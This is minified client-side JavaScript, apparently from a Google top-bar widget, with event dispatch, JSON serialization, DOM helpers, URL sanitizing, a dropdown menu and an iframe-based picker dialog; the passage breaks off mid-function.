_.k.dispatchEvent=function(a){var c,d=this.Cc();if(d)for(c=[];d;d=d.Cc())c.push(d);var d=this.Ja,e=a.type||a;if(_.ea(a))a=new _.de(a,d);else if(a instanceof _.de)a.target=a.target||d;else{var f=a;a=new _.de(e,d);_.Ba(a,f)}var f=!0,g;if(c)for(var h=c.length-1;!a.C&&0<=h;h--)g=a.w=c[h],f=g.Bb(e,!0,a)&&f;a.C||(g=a.w=d,f=g.Bb(e,!0,a)&&f,a.C||(f=g.Bb(e,!1,a)&&f));if(c)for(h=0;!a.C&&h<c.length;h++)g=a.w=c[h],f=g.Bb(e,!1,a)&&f;return f};_.k.P=function(){_.P.J.P.call(this);this.Rc();this.la=null};
_.k.Va=function(a,c,d,e){return this.L.add(String(a),c,!1,d,e)};_.k.Dc=function(a,c,d,e){return this.L.add(String(a),c,!0,d,e)};_.k.od=function(a,c,d,e){return this.L.remove(String(a),c,d,e)};_.k.kc=function(a){return _.ie(this.L,a)};_.k.Rc=function(a){var c;if(this.L){c=this.L;a=a&&a.toString();var d=0,e;for(e in c.b)if(!a||e==a){for(var f=c.b[e],g=0;g<f.length;g++)++d,_.fe(f[g]);delete c.b[e];c.o--}c=d}else c=0;return c};
_.k.Bb=function(a,c,d){a=this.L.b[String(a)];if(!a)return!0;a=a.concat();for(var e=!0,f=0;f<a.length;++f){var g=a[f];if(g&&!g.Ib&&g.nc==c){var h=g.listener,l=g.Hc||g.src;g.mc&&this.kc(g);e=!1!==h.call(l,d)&&e}}return e&&0!=d.Ue};_.k.nd=function(a,c,d,e){return _.Ce(this.L,String(a),c,d,e)};

}catch(e){_._DumpException(e)}
try{
_.Ee=function(){_.G.call(this);this.w=new _.P};_.v(_.Ee,_.G);_.Ee.prototype[_.ae]=!0;_.k=_.Ee.prototype;_.k.Va=function(a,c,d,e){return this.w.Va(a,c,d,e)};_.k.Dc=function(a,c,d,e){return this.w.Dc(a,c,d,e)};_.k.od=function(a,c,d,e){return this.w.od(a,c,d,e)};_.k.kc=function(a){return this.w.kc(a)};_.k.dispatchEvent=function(a){return this.w.dispatchEvent(a)};_.k.Rc=function(a){return this.w.Rc(a)};_.k.Cc=function(){return this.w.Cc()};_.k.Bb=function(a,c,d){return this.w.Bb(a,c,d)}; _.k.nd=function(a,c,d,e){return this.w.nd(a,c,d,e)};

}catch(e){_._DumpException(e)}
try{
var Fe,Ge,He,Ie,Pe,Te;Fe={'"':'\\"',"\\":"\\\\","/":"\\/","\b":"\\b","\f":"\\f","\n":"\\n","\r":"\\r","\t":"\\t","\x0B":"\\u000b"};Ge=function(a,c){c.push('"',a.replace(_.za,function(a){var c=Fe[a];c||(c="\\u"+(a.charCodeAt(0)|65536).toString(16).substr(1),Fe[a]=c);return c}),'"')};
He=function(a,c,d){if(null==c)d.push("null");else{if("object"==typeof c){if(_.da(c)){var e=c;c=e.length;d.push("[");for(var f="",g=0;g<c;g++)d.push(f),He(a,e[g],d),f=",";d.push("]");return}if(c instanceof String||c instanceof Number||c instanceof Boolean)c=c.valueOf();else{d.push("{");f="";for(e in c)Object.prototype.hasOwnProperty.call(c,e)&&(g=c[e],"function"!=typeof g&&(d.push(f),Ge(e,d),d.push(":"),He(a,g,d),f=","));d.push("}");return}}switch(typeof c){case "string":Ge(c,d);break;case "number":d.push((0,window.isFinite)(c)&&
!(0,window.isNaN)(c)?c:"null");break;case "boolean":d.push(c);break;case "function":break;default:throw Error("b`"+typeof c);}}};Ie=function(){};_.Je=function(a){a&&"function"==typeof a.aa&&a.aa()};_.Ke=function(a){var c=[];He(new Ie,a,c);return c.join("")};_.Le=function(a,c){var d=Array.prototype.slice.call(arguments,1);return function(){var c=d.slice();c.push.apply(c,arguments);return a.apply(this,c)}};
_.Me=function(a,c){var d=_.Le(_.Je,c);a.Sa?d.call(void 0):(a.Ra||(a.Ra=[]),a.Ra.push(_.n(void 0)?(0,_.t)(d,void 0):d))};_.Ne=function(a){return _.m.JSON&&_.m.JSON.stringify?_.m.JSON.stringify(a.fb()):_.Ke(a.fb())};_.Oe=function(a,c,d){c<a.A?a.o[c+a.B]=d:a.w[c]=d};Pe=[];_.Qe=function(a,c,d,e,f){if(_.da(c)){for(var g=0;g<c.length;g++)_.Qe(a,c[g],d,e,f);return null}d=_.se(d);return _.be(a)?a.Dc(c,d,e,f):_.te(a,c,d,!0,e,f)};_.Re=function(a){_.G.call(this);this.X=a;this.Y={}};_.v(_.Re,_.G);
_.Re.prototype.b=function(a,c,d,e){return Se(this,a,c,d,e)};_.Re.prototype.O=function(a,c,d,e,f){return Se(this,a,c,d,e,f)};var Se=function(a,c,d,e,f,g){_.da(d)||(d&&(Pe[0]=d.toString()),d=Pe);for(var h=0;h<d.length;h++){var l=_.O(c,d[h],e||a.handleEvent,f||!1,g||a.X||a);if(!l)break;a.Y[l.key]=l}return a};_.Re.prototype.H=function(a,c,d,e){return Te(this,a,c,d,e)};
Te=function(a,c,d,e,f,g){if(_.da(d))for(var h=0;h<d.length;h++)Te(a,c,d[h],e,f,g);else{c=_.Qe(c,d,e||a.handleEvent,f,g||a.X||a);if(!c)return a;a.Y[c.key]=c}return a};_.Ue=function(a){_.Lc(a.Y,_.ye);a.Y={}};_.Re.prototype.P=function(){_.Re.J.P.call(this);_.Ue(this)};_.Re.prototype.handleEvent=function(){throw Error("y");};_.Ve=function(a){return/^[\s\xa0]*$/.test(a)};_.We=function(a,c,d){return Math.min(Math.max(a,c),d)};_.Xe=function(a){var c=Number(a);return 0==c&&_.Ve(a)?window.NaN:c};
_.Ye=function(a,c){_.P.call(this);this.w=a||1;this.o=c||_.m;this.B=(0,_.t)(this.C,this);this.A=(0,_.la)()};_.v(_.Ye,_.P);_.Ye.prototype.enabled=!1;_.Ye.prototype.b=null;_.Ye.prototype.C=function(){if(this.enabled){var a=(0,_.la)()-this.A;0<a&&a<.8*this.w?this.b=this.o.setTimeout(this.B,this.w-a):(this.b&&(this.o.clearTimeout(this.b),this.b=null),this.dispatchEvent("tick"),this.enabled&&(this.b=this.o.setTimeout(this.B,this.w),this.A=(0,_.la)()))}};
_.Ze=function(a){a.enabled=!0;a.b||(a.b=a.o.setTimeout(a.B,a.w),a.A=(0,_.la)())};_.$e=function(a){a.enabled=!1;a.b&&(a.o.clearTimeout(a.b),a.b=null)};_.Ye.prototype.P=function(){_.Ye.J.P.call(this);_.$e(this);delete this.o};_.af=function(a,c,d){if(_.ga(a))d&&(a=(0,_.t)(a,d));else if(a&&"function"==typeof a.handleEvent)a=(0,_.t)(a.handleEvent,a);else throw Error("B");return 2147483647<c?-1:_.m.setTimeout(a,c||0)};

}catch(e){_._DumpException(e)}
try{
var cf,vf,wf;_.bf=function(a,c,d,e){d.b(c,e,void 0,a.X||a,a)};cf={};_.df=function(){this.b="";this.o=cf};_.df.prototype.ub=!0;_.df.prototype.mb=function(){return this.b};_.df.prototype.yd=!0;_.df.prototype.Wb=function(){return 1};_.ef=function(a){return a instanceof _.Ub&&a.constructor===_.Ub&&a.w===_.Tb?a.b:"type_error:SafeHtml"};_.ff=function(a){return a instanceof _.df&&a.constructor===_.df&&a.o===cf?a.b:"type_error:SafeUrl"};_.gf=function(a,c){this.width=a;this.height=c};_.k=_.gf.prototype;
_.k.clone=function(){return new _.gf(this.width,this.height)};_.k.dc=function(){return!(this.width*this.height)};_.k.ceil=function(){this.width=Math.ceil(this.width);this.height=Math.ceil(this.height);return this};_.k.floor=function(){this.width=Math.floor(this.width);this.height=Math.floor(this.height);return this};_.k.round=function(){this.width=Math.round(this.width);this.height=Math.round(this.height);return this};_.hf=function(a){return a.parentWindow||a.defaultView};
_.jf=function(a){return _.vb||"CSS1Compat"!=a.compatMode?a.body||a.documentElement:a.documentElement};_.kf=function(a,c){var d,e,f,g;d=window.document;d=c||d;if(d.querySelectorAll&&d.querySelector&&a)return d.querySelectorAll(""+(a?"."+a:""));if(a&&d.getElementsByClassName){var h=d.getElementsByClassName(a);return h}h=d.getElementsByTagName("*");if(a){g={};for(e=f=0;d=h[e];e++){var l=d.className;"function"==typeof l.split&&_.ya(l.split(/\s+/),a)&&(g[f++]=d)}g.length=f;return g}return h};
_.lf=function(a,c){this.x=_.n(a)?a:0;this.y=_.n(c)?c:0};_.lf.prototype.clone=function(){return new _.lf(this.x,this.y)};_.lf.prototype.ceil=function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this};_.lf.prototype.floor=function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this};_.lf.prototype.round=function(){this.x=Math.round(this.x);this.y=Math.round(this.y);return this};_.mf=function(a,c){a.innerHTML=_.ef(c)};
_.nf=function(a,c){if(a.contains&&1==c.nodeType)return a==c||a.contains(c);if("undefined"!=typeof a.compareDocumentPosition)return a==c||Boolean(a.compareDocumentPosition(c)&16);for(;c&&a!=c;)c=c.parentNode;return c==a};_.of=function(a){return a&&a.parentNode?a.parentNode.removeChild(a):null};_.pf=function(a){for(var c;c=a.firstChild;)a.removeChild(c)};_.qf=function(a){return a?_.hf(a):window};
_.rf=function(a){a=(a||window).document;a="CSS1Compat"==a.compatMode?a.documentElement:a.body;return new _.gf(a.clientWidth,a.clientHeight)};_.sf=function(a){this.b=a||_.m.document||window.document};_.sf.prototype.S=function(a){return _.ea(a)?this.b.getElementById(a):a};_.sf.prototype.o=function(a,c,d){return _.Sc(this.b,arguments)};_.sf.prototype.createElement=function(a){return this.b.createElement(a)};
_.tf=function(a){var c=a.b;a=_.jf(c);c=_.hf(c);return _.K&&_.L("10")&&c.pageYOffset!=a.scrollTop?new _.lf(a.scrollLeft,a.scrollTop):new _.lf(c.pageXOffset||a.scrollLeft,c.pageYOffset||a.scrollTop)};_.sf.prototype.appendChild=function(a,c){a.appendChild(c)};_.sf.prototype.w=_.pf;_.sf.prototype.removeNode=_.of;_.sf.prototype.contains=_.nf;_.uf=function(a){return 9==a.nodeType?a:a.ownerDocument||a.document};wf=0;_.xf=function(a){try{return a&&a.activeElement}catch(c){}return null}; _.yf=function(a,c){var d=c||window.document;return d.querySelectorAll&&d.querySelector?d.querySelectorAll("."+a):_.kf(a,c)};_.zf=function(a){return a?new _.sf(_.uf(a)):vf||(vf=new _.sf)};_.Af=function(a){return a[_.ia]||(a[_.ia]=++wf)};
var Gf;_.Bf=function(a,c){var d=_.uf(a);return d.defaultView&&d.defaultView.getComputedStyle&&(d=d.defaultView.getComputedStyle(a,null))?d[c]||d.getPropertyValue(c)||"":""};_.Cf=function(a,c){return _.Bf(a,c)||(a.currentStyle?a.currentStyle[c]:null)||a.style&&a.style[c]};_.Ef=function(a,c,d){var e;c instanceof _.lf?(e=c.x,c=c.y):(e=c,c=d);a.style.left=_.Df(e,!1);a.style.top=_.Df(c,!1)};
_.Ff=function(a){var c;try{c=a.getBoundingClientRect()}catch(d){return{left:0,top:0,right:0,bottom:0}}_.K&&a.ownerDocument.body&&(a=a.ownerDocument,c.left-=a.documentElement.clientLeft+a.body.clientLeft,c.top-=a.documentElement.clientTop+a.body.clientTop);return c};_.Df=function(a,c){"number"==typeof a&&(a=(c?Math.round(a):a)+"px");return a};
_.Hf=function(a){var c=Gf;if("none"!=_.Cf(a,"display"))return c(a);var d=a.style,e=d.display,f=d.visibility,g=d.position;d.visibility="hidden";d.position="absolute";d.display="inline";a=c(a);d.display=e;d.position=g;d.visibility=f;return a};Gf=function(a){var c=a.offsetWidth,d=a.offsetHeight,e=_.vb&&!c&&!d;return _.n(c)&&!e||!a.getBoundingClientRect?new _.gf(c,d):(a=_.Ff(a),new _.gf(a.right-a.left,a.bottom-a.top))};_.If=function(a,c){a.style.display=c?"":"none"}; _.Jf=_.ub?"MozUserSelect":_.vb?"WebkitUserSelect":null;_.K&&_.L(12);

}catch(e){_._DumpException(e)}
try{
var Kf,Lf;Kf=/^(?:([^:/?#.]+):)?(?:\/\/(?:([^/?#]*)@)?([^/#?]*?)(?::([0-9]+))?(?=[/#?]|$))?([^?#]+)?(?:\?([^#]*))?(?:#(.*))?$/;_.Mf=function(a){if(Lf){Lf=!1;var c=_.m.location;if(c){var d=c.href;if(d&&(d=(d=_.Mf(d)[3]||null)?(0,window.decodeURI)(d):d)&&d!=c.hostname)throw Lf=!0,Error();}}return a.match(Kf)};Lf=_.vb;_.Nf=function(a){a=_.Mf(a)[1]||null;!a&&window.self.location&&(a=window.self.location.protocol,a=a.substr(0,a.length-1));return a?a.toLowerCase():""};

}catch(e){_._DumpException(e)}
try{
var Of;var Pf;Pf=function(a){if(a.classList)return a.classList;a=a.className;return _.ea(a)&&a.match(/\S+/g)||[]};_.Qf=function(a,c){return a.classList?a.classList.contains(c):_.ya(Pf(a),c)};_.Q=function(a,c){a.classList?a.classList.add(c):_.Qf(a,c)||(a.className+=0<a.className.length?" "+c:c)};
_.Rf=function(a,c){if(a.classList)(0,_.ta)(c,function(c){_.Q(a,c)});else{var d={};(0,_.ta)(Pf(a),function(a){d[a]=!0});(0,_.ta)(c,function(a){d[a]=!0});a.className="";for(var e in d)a.className+=0<a.className.length?" "+e:e}};_.R=function(a,c){a.classList?a.classList.remove(c):_.Qf(a,c)&&(a.className=(0,_.ua)(Pf(a),function(a){return a!=c}).join(" "))};_.Sf=function(a,c){a.classList?(0,_.ta)(c,function(c){_.R(a,c)}):a.className=(0,_.ua)(Pf(a),function(a){return!_.ya(c,a)}).join(" ")}; _.Tf=function(a,c,d){d?_.Q(a,c):_.R(a,c)};
var Xf;_.Wf=function(a,c,d,e,f){if(!(_.K||_.vb&&_.L("525")))return!0;if(_.zb&&f)return _.Uf(a);if(f&&!e)return!1;_.fa(c)&&(c=_.Vf(c));if(!d&&(17==c||18==c||_.zb&&91==c))return!1;if(_.vb&&e&&d)switch(a){case 220:case 219:case 221:case 192:case 186:case 189:case 187:case 188:case 190:case 191:case 192:case 222:return!1}if(_.K&&e&&c==a)return!1;switch(a){case 13:return!0;case 27:return!_.vb}return _.Uf(a)};
_.Uf=function(a){if(48<=a&&57>=a||96<=a&&106>=a||65<=a&&90>=a||_.vb&&0==a)return!0;switch(a){case 32:case 63:case 107:case 109:case 110:case 111:case 186:case 59:case 189:case 187:case 61:case 188:case 190:case 191:case 192:case 222:case 219:case 220:case 221:return!0;default:return!1}};_.Vf=function(a){if(_.ub)a=Xf(a);else if(_.zb&&_.vb)a:switch(a){case 93:a=91;break a}return a}; Xf=function(a){switch(a){case 61:return 187;case 59:return 186;case 173:return 189;case 224:return 91;case 0:return 224;default:return a}};
_.Yf=function(a,c,d){_.da(d)&&(d=d.join(" "));var e="aria-"+c;""===d||void 0==d?(Of||(Of={atomic:!1,autocomplete:"none",dropeffect:"none",haspopup:!1,live:"off",multiline:!1,multiselectable:!1,orientation:"vertical",readonly:!1,relevant:"additions text",required:!1,sort:"none",busy:!1,disabled:!1,hidden:!1,invalid:"false"}),d=Of,c in d?a.setAttribute(e,d[c]):a.removeAttribute(e)):a.setAttribute(e,d)};
}catch(e){_._DumpException(e)}
try{
var Zf;Zf=[1,4,2];_.$f=function(a){return(_.je?0==a.b.button:"click"==a.type?!0:!!(a.b.button&Zf[0]))&&!(_.vb&&_.zb&&a.A)};var ag,cg;ag=function(){};_.bg=new ag;cg=["click",_.ub?"keypress":"keydown","keyup"];ag.prototype.b=function(a,c,d,e,f){var g=function(a){var d=_.se(c),f=_.Xd(a.target)?a.target.getAttribute("role")||null:null;"click"==a.type&&_.$f(a)?d.call(e,a):13!=a.keyCode&&3!=a.keyCode||"keyup"==a.type?32!=a.keyCode||"keyup"!=a.type||"button"!=f&&"tab"!=f||(d.call(e,a),a.preventDefault()):(a.type="keypress",d.call(e,a))};g.o=c;g.b=e;f?f.b(a,cg,g,d):_.O(a,cg,g,d)};
}catch(e){_._DumpException(e)}
try{
var eg,hg,ig,kg,lg,mg,og,pg;_.S=function(a,c){var d=c||window.document,e=null;d.getElementsByClassName?e=d.getElementsByClassName(a)[0]:d.querySelectorAll&&d.querySelector?e=d.querySelector("."+a):e=_.kf(a,c)[0];return e||null};_.dg=function(a,c,d,e,f){_.bg.b(c,d,e,f||a.X||a,a)};eg=function(a){return _.da(a)?(0,_.va)(a,eg):_.ea(a)?a:a?a.toString():a};_.fg=function(a,c,d){return function(){try{return c.apply(d,arguments)}catch(e){a.log(e)}}};
_.gg=function(a,c){if(a instanceof window.Element){var d=_.F("eq").B(a,c||[]);if(d)if(_.K&&d instanceof window.MouseEvent&&a.dispatchEvent){var e=window.document.createEvent("MouseEvent");e.initMouseEvent(d.type,!0,!0,d.view,d.detail,d.screenX,d.screenY,d.clientX,d.clientY,d.ctrlKey,d.altKey,d.shiftKey,d.metaKey,d.button,d.relatedTarget);a.dispatchEvent(e)}else a.dispatchEvent&&a.dispatchEvent(d)}};hg={"'":"%27","(":"%28",")":"%29","%5B":"[","%5D":"]","%25":"%"};ig=/[()']|%5B|%5D|%25/g;
_.jg=function(a,c){_.Re.call(this,c);this.B=a;this.Ia=c||this};_.v(_.jg,_.Re);_.jg.prototype.b=function(a,c,d,e){if(d){if("function"!=typeof d)throw new TypeError("Function expected");d=_.fg(this.B,d,this.Ia);d=_.jg.J.b.call(this,a,c,d,e);_.gg(a,eg(c));return d}return _.jg.J.b.call(this,a,c,d,e)};
_.jg.prototype.O=function(a,c,d,e,f){if(d){if("function"!=typeof d)throw new TypeError("Function expected");d=_.fg(this.B,d,f||this.Ia);d=_.jg.J.O.call(this,a,c,d,e,f);_.gg(a,eg(c));return d}return _.jg.J.O.call(this,a,c,d,e,f)};_.jg.prototype.H=function(a,c,d,e){if(d){if("function"!=typeof d)throw new TypeError("Function expected");d=_.fg(this.B,d,this.Ia);d=_.jg.J.H.call(this,a,c,d,e);_.gg(a,eg(c));return d}return _.jg.J.H.call(this,a,c,d,e)};kg=/[?&]($|#)/;lg=/#|$/;
mg=function(a,c,d,e){for(var f=d.length;0<=(c=a.indexOf(d,c))&&c<e;){var g=a.charCodeAt(c-1);if(38==g||63==g)if(g=a.charCodeAt(c+f),!g||61==g||38==g||35==g)return c;c+=f+1}return-1};_.ng=function(a){if(a[1]){var c=a[0],d=c.indexOf("#");0<=d&&(a.push(c.substr(d)),a[0]=c=c.substr(0,d));d=c.indexOf("?");0>d?a[1]="?":d==c.length-1&&(a[1]=void 0)}return a.join("")};og=function(a){try{var c=(0,window.encodeURI)(a)}catch(d){return"about:invalid#zClosurez"}return c.replace(ig,function(a){return hg[a]})};
pg=/^(?:(?:https?|mailto|ftp):|[^&:/?#]*(?:[/?#]|$))/i;_.qg=function(a,c){_.jg.call(this,c);this.o=a};_.v(_.qg,_.jg);_.qg.prototype.P=function(){this.o=null;_.qg.J.P.call(this)};_.rg=function(a,c){a.style.height=_.Df(c,!0)};_.sg=function(a){if(a instanceof _.df)return a;a=a.ub?a.mb():String(a);a=pg.test(a)?og(a):"about:invalid#zClosurez";var c=new _.df;c.b=a;return c};
_.tg=function(a,c,d){for(var e=a.search(lg),f=0,g,h=[];0<=(g=mg(a,f,c,e));)h.push(a.substring(f,g)),f=Math.min(a.indexOf("&",g)+1||e,e);h.push(a.substr(f));a=[h.join("").replace(kg,"$1"),"&",c];null!=d&&a.push("=",(0,window.encodeURIComponent)(String(d)));return _.ng(a)};_.ug=function(a,c,d){if(c instanceof _.gf)d=c.height,c=c.width;else if(void 0==d)throw Error("C");a.style.width=_.Df(c,!0);_.rg(a,d)};_.T=function(a){return _.ea(a)?window.document.getElementById(a):a}; _.vg=function(a,c){var d;d=c instanceof _.df?c:_.sg(c);a.href=_.ff(d)};
_.wg=function(a,c,d,e,f){_.qg.call(this,a,d);this.L=e;this.N=this.T=null;this.da=c;this.w=_.S("gb_ha",this.o);this.C=_.S("gb_ga",this.o);this.$=!1;this.F=_.F("dd");this.F.jh(this);this.w.setAttribute("aria-hidden","true");f||this.wa()};_.v(_.wg,_.qg);_.k=_.wg.prototype;
_.k.wa=function(){this.C&&(_.dg(this,this.C,this.Gc,!1,this),this.C.setAttribute("aria-expanded","false"));this.w&&_.dg(this,this.w,this.cg,!1,this);_.dg(this,window.document,this.ye,!0,this);this.O(window.document,_.Wf(27)?"keypress":"keyup",this.ya,!1,this);this.O(this.o,"mouseover",this.ug,!1,this);this.O(this.o,"mouseout",this.tg,!1,this)};_.k.getId=function(){return this.da};_.k.Gc=function(a){xg(this)?this.close():this.open();a.preventDefault();a.stopPropagation()};
_.k.cg=function(a){for(a=a.target;a&&a!=this.w;){if("A"==a.tagName&&!_.Qf(a,"gb_ec")){this.close(!0);this.C&&(0,window.setTimeout)((0,_.t)(this.C.focus,this.C),0);break}a=a.parentNode}};_.k.oc=function(a){return!(!a||!_.nf(this.o,a))};_.k.ye=function(a){this.oc(a.target)||this.close()};_.k.ug=function(a){yg(this,(0,_.t)(this.Zb,this),a)};_.k.tg=function(a){yg(this,(0,_.t)(this.td,this),a)};
var yg=function(a,c,d){var e=d.B&&_.nf(a.o,d.B),f=d.B&&zg(a,d.B);a=zg(a,d.target);e||c(0,d);e&&!f||a||c(1,d);!f&&a&&c(2,d)};_.wg.prototype.ya=function(a){if(27==a.keyCode){a=_.xf(window.document);var c=this.oc(a),d=xg(this);this.close();d&&c?this.C.focus():a&&a.focus()}};_.wg.prototype.Zb=_.Ac;_.wg.prototype.td=_.Ac;var zg=function(a,c){return c&&a.w?_.Qf(c,"gb_u")||_.Qf(c,"gb_v")||!!a.w&&_.nf(a.w,c):!1};_.wg.prototype.P=function(){_.wg.J.P.call(this);this.w=null};var Ag=function(a){if(a.C&&(a=a.C.getAttribute("data-ved")))return{ved:a}};
_.wg.prototype.open=function(){if(!xg(this)){this.F.dd(0,this);this.F.Ve(this);_.Q(this.o,"gb_ia");this.w.setAttribute("aria-hidden","false");this.C&&this.C.setAttribute("aria-expanded","true");if(_.K&&this.w){var a=_.S("gb_ja");if(!a){var a=_.N("IFRAME",{"class":"gb_ja",src:'javascript:""',frameBorder:0}),c=_.S("gb_ba");c&&c.appendChild(a)}_.R(a,"gb_c");_.Bg(this)}this.T&&this.L.log(this.T,Ag(this));this.F.dd(1,this);this.qe()}};_.wg.prototype.qe=function(){this.w.focus()};
_.Bg=function(a){if(_.K&&a.w){var c=_.S("gb_ja");c&&_.ug(c,_.Hf(a.w))}};_.wg.prototype.close=function(a){if(xg(this)&&this.F.pf(this)){this.F.Je(this)&&this.F.Ve(null);_.R(this.o,"gb_ia");this.w.setAttribute("aria-hidden","true");this.C&&this.C.setAttribute("aria-expanded","false");if(_.K){var c=_.S("gb_ja");c&&_.Q(c,"gb_c")}!a&&this.N&&this.L.log(this.N,Ag(this));this.F.dd(2,this);return!0}return!1};var xg=function(a){return _.Qf(a.o,"gb_ia")};

}catch(e){_._DumpException(e)}
try{
var Fg,Jg,Lg,Xg,Yg,ch,eh,fh;_.Dg=function(a){_.y(this,a,0,null)};_.v(_.Dg,_.x);_.Eg=function(a){_.y(this,a,0,null)};_.v(_.Eg,_.x);_.Eg.prototype.Ua=function(){return _.z(this,5)};Fg=function(a,c){var d=a.style;"opacity"in d?d.opacity=c:"MozOpacity"in d?d.MozOpacity=c:"filter"in d&&(d.filter=""===c?"":"alpha(opacity="+100*c+")")};_.Gg=function(a){return a};_.Hg=function(){var a=_.H(_.I.M());return _.B(a,_.Dg,15)};_.Ig=function(a){return _.B(a,_.Eg,2)};
Jg=function(a,c,d){if(_.da(c))for(var e=0;e<c.length;e++)Jg(a,String(c[e]),d);else null!=c&&d.push("&",a,""===c?"":"=",(0,window.encodeURIComponent)(String(c)))};_.Kg=function(a){a=a.getOpenParams().onepick_dialog;if(!a)throw Error("D");return a};Lg=function(a,c){this.b=a||new _.sf;this.w=(0,_.t)(this.B,this);this.o=(0,_.t)(this.Pc,this);this.A=!!c};_.v(Lg,_.G);_.k=Lg.prototype;_.k.Wc=!1;_.k.G=null;_.k.ta=null;_.k.Qa=null;_.k.Yd=null;
var Mg=function(a){a.wb();return a.Yd},Ng=function(a,c,d){a.addEventListener?a.addEventListener(c,d,!1):a.attachEvent("on"+c,d)},Og=function(a,c,d){a.removeEventListener?a.removeEventListener(c,d,!1):a.detachEvent("on"+c,d)},Qg=function(a){a.ta&&(Og(a.ta,"scroll",a.o),Og(a.ta,Pg(a),a.o))},Pg=function(a){return"undefined"!=typeof _.hf(a.b.b).o?"DOMMouseScroll":"mousewheel"};
Lg.prototype.wb=function(){if(!this.G){var a=this.b;this.Qa=a.o("iframe",{frameborder:0,style:"border:0;left:0;position:absolute;top:0;vertical-align:bottom;z-index:1101",src:_.K?'javascript:""':"javascript:undefined"});_.If(this.Qa,!1);Fg(this.Qa,0);this.ta=a.o("div",{style:"background:#fff;display:none;left:0;position:absolute;top:0;z-index:1101"});_.If(this.ta,!1);Fg(this.ta,.5);var a=this.b,c=this.G=a.o("div",{style:"background:#fff;border:1px solid #bebebe;box-shadow:rgba(0,0,0,.2) 0 4px 16px;height:auto;overflow:hidden;position:absolute;width:auto;z-index:1101;-moz-box-shadow:rgba(0,0,0,.2) 0 4px 16px;-webkit-box-shadow:rgba(0,0,0,.2) 0 4px 16px",
name:"dialog"},this.Yd=a.o("div"));c.setAttribute("role","dialog");c.o="dialog";this.G.style.visibility="hidden";_.Ef(this.G,-1E4,-1E4);a=a.b.body;a.appendChild(this.Qa);a.appendChild(this.ta);a.appendChild(this.G)}};
Lg.prototype.Tc=function(a){a!=this.Wc&&(this.G||this.wb(),a?(Rg(this),Ng(_.hf(this.b.b),"resize",this.w),this.ta&&(Ng(this.ta,"scroll",this.o),Ng(this.ta,Pg(this),this.o))):(Og(_.hf(this.b.b),"resize",this.w),Qg(this)),_.If(this.Qa,a),_.If(this.ta,a),a?Sg(this):(this.G.style.visibility="hidden",_.Ef(this.G,-1E4,-1E4)),(this.Wc=a)&&"hidden"==this.G.style.visibility&&(this.G.style.visibility="visible"),a?this.focus():this.A&&this.aa())};Lg.prototype.V=function(){return this.Wc};
Lg.prototype.focus=function(){try{this.G.focus()}catch(a){}};var Rg=function(a){_.If(a.Qa,!1);_.If(a.ta,!1);var c=a.b.b,d=_.rf(_.qf(c)||window),e=Math.max(c.body.scrollWidth,d.width),c=Math.max(c.body.scrollHeight,d.height);_.If(a.Qa,!0);_.ug(a.Qa,e,c);_.If(a.ta,!0);_.ug(a.ta,e,c)};Lg.prototype.B=function(){Rg(this);Sg(this)};Lg.prototype.Pc=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;a.stopPropagation?a.stopPropagation():a.cancelBubble=!0};
var Sg=function(a){var c=a.G,d=_.Hf(c),e=a.b;a=_.tf(e);var f=_.rf(_.hf(e.b)),e=Math.max(a.x+(f.width-d.width)/2,0),d=Math.max(a.y+(f.height-d.height)/2,0);_.Ef(c,e,d)};Lg.prototype.P=function(){this.Wc&&(Og(_.hf(this.b.b),"resize",this.w),Qg(this));this.G&&(_.of(this.G),this.G=null);this.ta&&(_.of(this.ta),this.ta=null);this.Qa&&(_.of(this.Qa),this.Qa=null)};_.Tg=function(a,c){for(var d in c)Jg(d,c[d],a);return a};_.Ug=function(a){this.b=a};
_.Wg=function(){var a=new _.Ug(_.zf(window)),c=_.hf(a.b.b),d=c.iframes||c.parent.iframes;if(d&&d.setHandler){var e={};_.Vg(a,e);d.setHandler("onepick",e)}(c=(c.gapi||c.parent.gapi||{}).iframes)&&c.registerStyle("onepick",(0,_.t)(a.o,a))};_.Vg=function(a,c){c.onOpen=(0,_.t)(a.B,a);c.onClose=(0,_.t)(a.w,a)};
Xg=function(a,c){var d=new Lg(a.b,c.disposeOnHide);c.onepick_dialog=d;d.wb();var e,f=_.hf(a.b.b);e=c.width;var g=c.height;e?(e=Math.max(566,Math.min(1051,e)),g||(f=_.rf(f),g=.85*f.height),f=Math.max(350,Math.min(650,g))):(f=_.rf(f),e=.618*f.width,f=e<f.height?Math.round(Math.max(350,Math.min(650,.85*e))):Math.round(Math.max(350,Math.min(650,.85*f.height))),e=Math.round(f/.618));e=new _.gf(e,f);_.ug(d.Yd,e.width,e.height);Sg(d);d.Tc(!0);return d};
Yg=function(){return{style:"border:0;height:100%;overflow:hidden",allowtransparency:"true"}};_.Ug.prototype.B=function(a){var c=a.getOpenParams(),c=Xg(this,c);a.openInto(Mg(c),Yg())};_.Ug.prototype.o=function(a){var c=Xg(this,a);a.where=Mg(c);a.attributes=Yg();a.onClose=(0,_.t)(function(a){a.Tc(!1)},this,c)};_.Ug.prototype.w=function(a){_.Kg(a).Tc(!1)};_.Zg=function(a,c,d,e,f,g,h){var l="";a&&(l+=a+":");d&&(l+="//",c&&(l+=c+"@"),l+=d,e&&(l+=":"+e));f&&(l+=f);g&&(l+="?"+g);h&&(l+="#"+h);return l};
_.$g=function(a){a=_.Tg([],a);a[0]="";return a.join("")};_.ah=function(a,c,d,e,f,g){e=_.fg(a,e,g);a=_.O(c,d,e,f,g);_.gg(c,d);return a};_.bh=function(a,c){for(;a&&1!=a.nodeType;)a=c?a.nextSibling:a.previousSibling;return a};ch=function(a){_.G.call(this);this.C=a;this.w=this.b=null;this.F=0;this.A={};this.o=!1;a=window.navigator.userAgent;0<=a.indexOf("MSIE")&&0<=a.indexOf("Trident")&&(a=/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a))&&a[1]&&9>(0,window.parseFloat)(a[1])&&(this.o=!0)};_.v(ch,_.G);
ch.prototype.Nd=function(a,c){if(!this.o)if(c instanceof Array)for(var d in c)this.Nd(a,c[d]);else{d=(0,_.t)(this.D,this,a);var e=this.F+c;this.F++;a.setAttribute("data-eqid",e);this.A[e]=d;a&&a.addEventListener?a.addEventListener(c,d,!1):a&&a.attachEvent?a.attachEvent("on"+c,d):this.C.log(Error("z`"+a))}};
